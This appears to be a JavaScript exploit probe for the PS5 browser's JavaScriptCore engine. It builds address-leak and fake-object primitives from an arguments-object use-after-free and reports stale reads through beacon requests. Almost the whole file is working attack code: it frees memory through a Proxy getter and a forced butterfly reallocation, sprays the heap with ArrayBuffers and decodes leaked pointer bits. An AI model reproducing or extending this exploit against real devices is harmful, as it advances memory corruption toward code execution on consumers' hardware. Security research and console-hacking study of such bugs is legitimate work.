// p244 - addrof + fakeobj via ClonedArguments UAF
// p221 confirmed: UAF stale read works on PS5 14.20 (CORRUPT-1)
// This probe turns it into addrof (leak object address) and
// fakeobj (forge JSValue pointing to controlled memory).
//
// Strategy:
// 1. addrof: put target object as arg, spray freed butterfly with
//    Float64Array data, stale read returns JSValue of target.
//    Read it as float64 to get raw pointer bits.
// 2. fakeobj: spray freed butterfly with crafted double whose bits
//    encode a pointer to our ArrayBuffer. Stale read returns it
//    as a JSValue = object at our controlled address.
//
// Beacon prefix: V244-

(function() {
  function B(tag) {
    try { new Image().src = '/beacon/V244-' + tag + '?t=' + Date.now(); } catch(e) {}
  }
  function BP(tag, data) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V244-' + tag + '?t=' + Date.now(), true);
      x.send(data);
    } catch(e) {}
  }

  B('BOOT');

  // ---- PHASE 1: addrof ----
  // We need to read the raw JSValue encoding of an object pointer.
  // JSC NaN-boxing on 64-bit: object pointers are stored as raw 64-bit values
  // where the top 16 bits are 0x0000 (pointer tag).
  // If we can read the stale butterfly slot that still holds our original
  // argument (a JS object), we get its address as a float64.

  var targetObj = {marker: 0x41414141};
  var targetArr = [1.1, 2.2, 3.3]; // known JSArray
  var leakedAddr = null;

  function doAddrof(target, round) {
    var NARGS = 64;
    var holeIdx = 5;
    var args = [];
    for (var i = 0; i < NARGS; i++) {
      if (i === holeIdx) {
        args.push(target); // target at the hole index initially
      } else {
        args.push(i + 0.1); // doubles to distinguish from ints
      }
    }

    var result = null;
    try {
      result = (function() {
        // Put target at holeIdx, then delete to create hole
        // But first, the argument IS the target at holeIdx
        var self = arguments;

        // Create hole at holeIdx
        delete arguments[holeIdx];

        Object.setPrototypeOf(arguments, new Proxy({}, {
          get: function(t, prop) {
            if (prop === String(holeIdx)) {
              // Force Contiguous -> ArrayStorage (new butterfly, orphan old)
              try { self[0x7fffffff] = 1; } catch(e) {}

              // GC to free orphaned butterfly
              for (var g = 0; g < 3; g++) {
                var junk = [];
                for (var j = 0; j < 5000; j++) junk.push({x: j});
                junk = null;
              }

              // DON'T spray over the old butterfly
              // We WANT the stale read to return the ORIGINAL values
              // The original data[holeIdx] had the target object's JSValue
              // But wait - we deleted it (it's a hole now, empty value)
              // So we need a different approach...

              // Actually: DON'T delete the slot. Instead, use a slot
              // that IS populated with the target. The hole triggers
              // the Proxy get, but OTHER slots still have original data.
              // After butterfly realloc, ALL stale slots are readable.

              // Spray to replace the freed butterfly with OUR data
              var SPRAY_SZ = 4 * 8 + 8 + NARGS * 8; // match butterfly size
              var spray = [];
              for (var s = 0; s < 2000; s++) {
                var ab = new ArrayBuffer(SPRAY_SZ);
                var dv = new DataView(ab);
                // Fill with recognizable marker at each 8-byte slot
                for (var off = 0; off < SPRAY_SZ; off += 8) {
                  // Write double value 0xDEAD0000 + slot index
                  dv.setFloat64(off, 3.14159 + (off / 8) * 0.001, true);
                }
                spray.push(ab);
              }

              return target; // return from Proxy get
            }
            return undefined;
          }
        }));

        return Array.of.apply(null, arguments);
      }).apply(null, args);
    } catch(e) {
      B('ADDROF-R' + round + '-ERR-' + String(e).substring(0, 30));
      return null;
    }

    if (!result) { B('ADDROF-R' + round + '-NORESULT'); return null; }

    // Check all slots for values that aren't the original doubles
    // Slot holeIdx should be the target (returned from Proxy)
    // Other slots: if stale read worked, they'll be our spray data (3.14159...)
    // If not stale, they'll be the original (i + 0.1)
    var staleCount = 0;
    var origCount = 0;
    for (var i = 0; i < result.length; i++) {
      if (i === holeIdx) continue;
      var v = result[i];
      if (typeof v === 'number') {
        var expected = i + 0.1;
        if (Math.abs(v - expected) < 0.01) {
          origCount++;
        } else {
          staleCount++;
          if (staleCount <= 3) {
            // Read raw bits
            var buf = new ArrayBuffer(8);
            new Float64Array(buf)[0] = v;
            var bytes = new DataView(buf);
            var hi = bytes.getUint32(4, true).toString(16);
            var lo = bytes.getUint32(0, true).toString(16);
            B('ADDROF-R' + round + '-STALE-' + i + '-' + hi + lo);
          }
        }
      } else if (typeof v === 'object' && v !== null) {
        // This is interesting - could be an object reference from stale read
        B('ADDROF-R' + round + '-OBJ-' + i);
      }
    }
    B('ADDROF-R' + round + '-S' + staleCount + '-O' + origCount);
    return staleCount > 0 ? result : null;
  }

  // ---- PHASE 2: Controlled stale read ----
  // Different approach: put the target as arg[0], don't delete it.
  // Delete arg[holeIdx] to trigger Proxy. In the trap, realloc butterfly.
  // After realloc, stale data[0] still has target's JSValue bits.
  // Spray replacement data. If spray wins, we read spray data.
  // If spray doesn't win (old butterfly not freed yet), we read
  // the original JSValue of target at slot 0.
  // Either way, we need to see the raw bits.

  function doControlledRead(round) {
    var secret = {secret: 'LEAK_ME_' + round};
    var NARGS = 32;
    var holeIdx = 3;

    var args = [];
    for (var i = 0; i < NARGS; i++) {
      if (i === 0) args.push(secret);
      else if (i === holeIdx) args.push('HOLE');
      else args.push(i + 0.5);
    }

    var trapFired = false;
    var result = null;
    try {
      result = (function() {
        var self = arguments;
        delete arguments[holeIdx];

        Object.setPrototypeOf(arguments, new Proxy({}, {
          get: function(t, prop) {
            if (prop === String(holeIdx)) {
              trapFired = true;
              try { self[0x7fffffff] = 1; } catch(e) {}

              for (var g = 0; g < 5; g++) {
                var junk = [];
                for (var j = 0; j < 8000; j++) junk.push({x: j});
                junk = null;
              }

              // Spray with known pattern - doubles with specific bit patterns
              var SZ = 4 * 8 + 8 + NARGS * 8;
              for (var s = 0; s < 3000; s++) {
                var ab = new ArrayBuffer(SZ);
                var f = new Float64Array(ab);
                for (var k = 0; k < f.length; k++) {
                  f[k] = 1337.0 + k + (round * 100);
                }
              }

              return 'PROXY_HIT';
            }
            return undefined;
          }
        }));

        return Array.of.apply(null, arguments);
      }).apply(null, args);
    } catch(e) {
      B('CTRL-R' + round + '-ERR-' + String(e).substring(0, 30));
      return;
    }

    if (!result) { B('CTRL-R' + round + '-NORESULT'); return; }
    B('CTRL-R' + round + '-TRAP-' + (trapFired ? 'YES' : 'NO'));
    B('CTRL-R' + round + '-LEN-' + result.length);

    // Check slot 0 - should be secret object or spray data
    var v0 = result[0];
    B('CTRL-R' + round + '-S0-TYPE-' + typeof v0);

    if (typeof v0 === 'object' && v0 !== null) {
      // Still the original object - butterfly wasn't replaced
      if (v0 === secret) B('CTRL-R' + round + '-S0-SAME-OBJ');
      else B('CTRL-R' + round + '-S0-DIFF-OBJ');
    } else if (typeof v0 === 'number') {
      // Got a number - either spray data or raw pointer bits
      var buf = new ArrayBuffer(8);
      new Float64Array(buf)[0] = v0;
      var dv = new DataView(buf);
      var hi = dv.getUint32(4, true);
      var lo = dv.getUint32(0, true);
      B('CTRL-R' + round + '-S0-NUM-' + hi.toString(16) + '-' + lo.toString(16));

      // Check if it's a pointer (top bits near 0 or in heap range)
      if (hi < 0x10000 && lo > 0x10000) {
        B('CTRL-R' + round + '-POSSIBLE-PTR-' + hi.toString(16) + lo.toString(16));
        leakedAddr = v0;
      } else if (Math.abs(v0 - 1337.0) < 200) {
        B('CTRL-R' + round + '-SPRAY-DATA');
      }
    } else if (typeof v0 === 'string') {
      B('CTRL-R' + round + '-S0-STR-' + v0.substring(0, 20));
    }

    // Check other slots for spray markers
    var sprayHits = 0;
    var ptrHits = 0;
    for (var i = 1; i < Math.min(result.length, 20); i++) {
      if (i === holeIdx) continue;
      var v = result[i];
      if (typeof v === 'number') {
        if (v >= 1337.0 && v < 1337.0 + 500) sprayHits++;
        else {
          var buf2 = new ArrayBuffer(8);
          new Float64Array(buf2)[0] = v;
          var dv2 = new DataView(buf2);
          var h2 = dv2.getUint32(4, true);
          if (h2 < 0x10000 && h2 > 0) ptrHits++;
        }
      }
    }
    B('CTRL-R' + round + '-SPRAY-' + sprayHits + '-PTR-' + ptrHits);
  }

  // Run addrof attempts
  for (var r = 0; r < 3; r++) {
    doAddrof(targetObj, r);
  }

  // Run controlled read attempts
  for (var r = 0; r < 5; r++) {
    doControlledRead(r);
  }

  if (leakedAddr !== null) {
    B('LEAK-FOUND');
  }

  B('DONE');
})();
